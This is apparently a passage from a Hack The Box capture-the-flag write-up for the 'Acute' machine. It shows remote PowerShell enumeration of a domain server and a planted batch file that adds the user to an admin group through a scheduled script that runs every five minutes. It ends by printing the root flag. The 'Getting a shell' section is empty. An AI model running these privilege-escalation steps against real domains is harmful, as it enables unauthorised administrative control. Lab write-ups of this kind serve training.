Authentication authority asserted identity   Well-known group S-1-18-1                                       Mandatory 

group, Enabled by default, Enabled group             

ACUTE\Denied RODC Password Replication Group Alias            S-1-5-21-1786406921-1914792807-2072761762-572  Mandatory 

group, Enabled by default, Enabled group, Local Group

Mandatory Label\High Mandatory Level         Label            S-1-16-12288                                             

                                                     

 

 

PRIVILEGES INFORMATION

----------------------

 

Privilege Name                            Description                                                        State  

========================================= ================================================================== =======

SeIncreaseQuotaPrivilege                  Adjust memory quotas for a process                                 Enabled

SeMachineAccountPrivilege                 Add workstations to domain                                         Enabled

SeSecurityPrivilege                       Manage auditing and security log                                   Enabled

SeTakeOwnershipPrivilege                  Take ownership of files or other objects                           Enabled

SeLoadDriverPrivilege                     Load and unload device drivers                                     Enabled

SeSystemProfilePrivilege                  Profile system performance                                         Enabled

SeSystemtimePrivilege                     Change the system time                                             Enabled

SeProfileSingleProcessPrivilege           Profile single process                                             Enabled

SeIncreaseBasePriorityPrivilege           Increase scheduling priority                                       Enabled

SeCreatePagefilePrivilege                 Create a pagefile                                                  Enabled

SeBackupPrivilege                         Back up files and directories                                      Enabled

SeRestorePrivilege                        Restore files and directories                                      Enabled

SeShutdownPrivilege                       Shut down the system                                               Enabled

SeDebugPrivilege                          Debug programs                                                     Enabled

SeSystemEnvironmentPrivilege              Modify firmware environment values                                 Enabled

SeChangeNotifyPrivilege                   Bypass traverse checking                                           Enabled

SeRemoteShutdownPrivilege                 Force shutdown from a remote system                                Enabled

SeUndockPrivilege                         Remove computer from docking station                               Enabled

SeEnableDelegationPrivilege               Enable computer and user accounts to be trusted for delegation     Enabled

SeManageVolumePrivilege                   Perform volume maintenance tasks                                   Enabled

SeImpersonatePrivilege                    Impersonate a client after authentication                          Enabled

SeCreateGlobalPrivilege                   Create global objects                                              Enabled

SeIncreaseWorkingSetPrivilege             Increase a process working set                                     Enabled

SeTimeZonePrivilege                       Change the time zone                                               Enabled

SeCreateSymbolicLinkPrivilege             Create symbolic links                                              Enabled

SeDelegateSessionUserImpersonatePrivilege Obtain an impersonation token for another user in the same session Enabled

 

 

USER CLAIMS INFORMATION

-----------------------

 

User claims unknown.

 

Kerberos support for Dynamic Access Control on this device has been disabled.
```

I was now awallace, and appeared to be a full admin again

```
PS C:\utils> 

Invoke-Command -computername ATSSERVER -ConfigurationName dc_manage -ScriptBlock{ls env:} -credential $cred

 

Name                           Value                                        PSComputerName                             

----                           -----                                        --------------                             

ALLUSERSPROFILE                C:\ProgramData                               ATSSERVER                                  

APPDATA                        C:\Users\awallace\AppData\Roaming            ATSSERVER                                  

CommonProgramFiles             C:\Program Files\Common Files                ATSSERVER                                  

CommonProgramFiles(x86)        C:\Program Files (x86)\Common Files          ATSSERVER                                  

CommonProgramW6432             C:\Program Files\Common Files                ATSSERVER                                  

COMPUTERNAME                   ATSSERVER                                    ATSSERVER                                  

ComSpec                        C:\Windows\system32\cmd.exe                  ATSSERVER                                  

DriverData                     C:\Windows\System32\Drivers\DriverData       ATSSERVER                                  

LOCALAPPDATA                   C:\Users\awallace\AppData\Local              ATSSERVER                                  

NUMBER_OF_PROCESSORS           2                                            ATSSERVER                                  

OS                             Windows_NT                                   ATSSERVER                                  

Path                           C:\Windows\system32;C:\Windows;C:\Windows... ATSSERVER                                  

PATHEXT                        .COM;.EXE;.BAT;.CMD;.VBS;.VBE;.JS;.JSE;.W... ATSSERVER                                  

PROCESSOR_ARCHITECTURE         AMD64                                        ATSSERVER                                  

PROCESSOR_IDENTIFIER           Intel64 Family 6 Model 85 Stepping 7, Gen... ATSSERVER                                  

PROCESSOR_LEVEL                6                                            ATSSERVER                                  

PROCESSOR_REVISION             5507                                         ATSSERVER                                  

ProgramData                    C:\ProgramData                               ATSSERVER                                  

ProgramFiles                   C:\Program Files                             ATSSERVER                                  

ProgramFiles(x86)              C:\Program Files (x86)                       ATSSERVER                                  

ProgramW6432                   C:\Program Files                             ATSSERVER                                  

PSModulePath                   C:\Users\awallace\Documents\WindowsPowerS... ATSSERVER                                  

PUBLIC                         C:\Users\Public                              ATSSERVER                                  

SystemDrive                    C:                                           ATSSERVER                                  

SystemRoot                     C:\Windows                                   ATSSERVER                                  

TEMP                           C:\Users\awallace\AppData\Local\Temp         ATSSERVER                                  

TMP                            C:\Users\awallace\AppData\Local\Temp         ATSSERVER                                  

USERDNSDOMAIN                  ACUTE.LOCAL                                  ATSSERVER                                  

USERDOMAIN                     ACUTE                                        ATSSERVER                                  

USERNAME                       awallace                                     ATSSERVER                                  

USERPROFILE                    C:\Users\awallace                            ATSSERVER                                  

windir                         C:\Windows                                   ATSSERVER                                  
```

```
PS C:\utils> 

Invoke-Command -computername ATSSERVER -ConfigurationName dc_manage -ScriptBlock{net group "Domain Admins"} -credential

 $cred

Group name     Domain Admins

Comment        Designated administrators of the domain

 

Members

 

-------------------------------------------------------------------------------

Administrator            

The command completed successfully.
```

Administrator was a Domain Admin

```
PS C:\utils> 

Invoke-Command -computername ATSSERVER -ConfigurationName dc_manage -ScriptBlock{Get-ChildItem 'C:\Program Files', 'C:\

Program Files (x86)' } -credential $cred

 

 

    Directory: C:\Program Files

 

 

Mode                 LastWriteTime         Length Name                               PSComputerName                    

----                 -------------         ------ ----                               --------------                    

d-----        12/21/2021  12:04 AM                common files                       ATSSERVER                         

d-----        12/21/2021  12:11 AM                Hyper-V                            ATSSERVER                         

d-----         9/15/2018   8:12 AM                internet explorer                  ATSSERVER                         

d-----         7/16/2022   9:42 AM                keepmeon                           ATSSERVER                         

d-----        12/21/2021  12:04 AM                VMware                             ATSSERVER                         

d-----        12/20/2021   9:19 PM                Windows Defender                   ATSSERVER                         

d-----        12/20/2021   9:12 PM                Windows Defender Advanced Threat   ATSSERVER                         

                                                  Protection                                                           

d-----        12/21/2021   2:13 PM                WindowsPowerShell                  ATSSERVER                         

 

 

    Directory: C:\Program Files (x86)

 

 

Mode                 LastWriteTime         Length Name                               PSComputerName                    

----                 -------------         ------ ----                               --------------                    

d-----         9/15/2018   8:21 AM                common files                       ATSSERVER                         

d-----         9/15/2018   8:12 AM                internet explorer                  ATSSERVER                         

d-----         9/15/2018   8:12 AM                Microsoft.NET                      ATSSERVER                         

d-----          8/5/2021   8:29 PM                Windows Defender                   ATSSERVER                         

d-----         9/15/2018   8:12 AM                WindowsPowerShell                  ATSSERVER                         
```

There was an interesting folder called `keepmeon` in the program files folder

```
PS C:\utils> 

Invoke-Command -computername ATSSERVER -ConfigurationName dc_manage -ScriptBlock{Get-ChildItem 'C:\Program Files\keepme

on' } -credential $cred

 

 

    Directory: C:\Program Files\keepmeon

 

 

Mode                 LastWriteTime         Length Name                               PSComputerName                    

----                 -------------         ------ ----                               --------------                    

-a----        12/21/2021   2:57 PM            128 keepmeon.bat                       ATSSERVER                         

-a----         7/16/2022   9:50 AM             45 uwu.bat                            ATSSERVER                         
```

It contained two .bat files 

```
PS C:\utils> Invoke-Command -computername ATSSERVER -ConfigurationName dc_manage -ScriptBlock{Get-Content 'C:\Program Files\keepmeon\uwu.bat' } -credential $cred

net group Site_Admin awallace /add /domain 
```

I was not able to run the .bat file no matter how I tried (I tried many things); running the command inside by iteslf resulted in System Error 5: Access is denied

```
PS C:\utils> 

Invoke-Command -computername ATSSERVER -ConfigurationName dc_manage -ScriptBlock{$(cat C:\"Program Files"\keepmeon\keep

meon.bat) } -credential $cred

REM This is run every 5 minutes. For Lois use ONLY

@echo off

 for /R %%x in (*.bat) do (

 if not "%%x" == "%~0" call "%%x"

)
```

The other script was  interesting

### Getting a shell

### Root.txt

```
PS C:\utils> 

Invoke-Command -computername ATSSERVER -ConfigurationName dc_manage -ScriptBlock{cat C:\Users\Administrator\Desktop\roo

t.txt } -credential $cred

e52794b6fbeaf994e93dce5c5f3605d0
```

Thanks to [`<box_creator>`](https://www.hackthebox.eu/home/users/profile/<profile_num>) for something interesting or useful about this machine.

If you like this content and would like to see more, please consider [buying me a coffee](https://www.buymeacoffee.com/zweilosec)!
